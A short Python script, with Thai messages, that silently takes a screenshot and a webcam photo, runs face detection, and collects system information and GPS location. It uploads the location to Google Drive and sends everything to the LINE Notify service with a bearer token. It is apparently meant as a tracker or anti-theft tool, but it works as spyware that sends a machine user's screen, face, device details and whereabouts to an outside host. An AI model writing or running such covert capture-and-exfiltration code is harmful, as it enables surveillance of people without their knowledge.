import numpy as np
import cv2
import pyautogui
import requests
import time
from face_detection import Face_detection, face_detection_percent
from system_info import *
from Global_Positioning_System import *
from drive import *
image = pyautogui.screenshot()
camera_port = 0
camera = cv2.VideoCapture(camera_port)
Face_detection()
System_information()
gps()
image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
cv2.imwrite("screenshot.png", image)
time.sleep(0.1)
return_value, image = camera.read()
cv2.imwrite("camera1.png", image)
del (camera)
uploadmap()
token = ##########
picture = "./screenshot.png"
picture2 = "./camera1.png"
payload = {"message": (System_information.system_infos)}
payload2 = {"message": ("พบใบหน้าหรือตา: "+face_detection_percent)}
payload3 = {"message": ("ระบบ global positioning system ส่งตำแหน่งไปยัง googledrive เรียบร้อยแล้ว    ลิ้งค์: https://drive.google.com/drive/folders/18eZU1H4-2LXdP60oHs8a7_Ag6FMXZCAV?usp=sharing")}
x = requests.post('https://notify-api.line.me/api/notify', headers={
                  'Authorization': 'Bearer {}'.format(token)}, params=payload, files={'imageFile': open(picture, 'rb')})
y = requests.post('https://notify-api.line.me/api/notify', headers={'Authorization': 'Bearer {}'.format(
    token)}, params=payload2, files={'imageFile': open(picture2, 'rb')})
z =  requests.post('https://notify-api.line.me/api/notify', headers={'Authorization': 'Bearer {}'.format(
    token)}, params=payload3)
